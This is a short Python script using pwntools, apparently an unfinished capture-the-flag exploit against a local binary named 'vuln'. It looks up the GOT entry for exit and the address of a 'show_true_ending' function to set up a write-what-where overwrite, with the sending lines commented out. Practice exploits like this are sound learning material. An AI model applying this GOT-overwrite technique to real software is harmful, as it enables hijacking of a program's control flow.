from pwn import *
p = process('./vuln')
elf = ELF('./vuln')

where = (elf.got['exit'])
what = (elf.symbols['show_true_ending'])


print(where)
print(what)

#p.sendline(where)
#p.sendline(what)
#p.interactive()
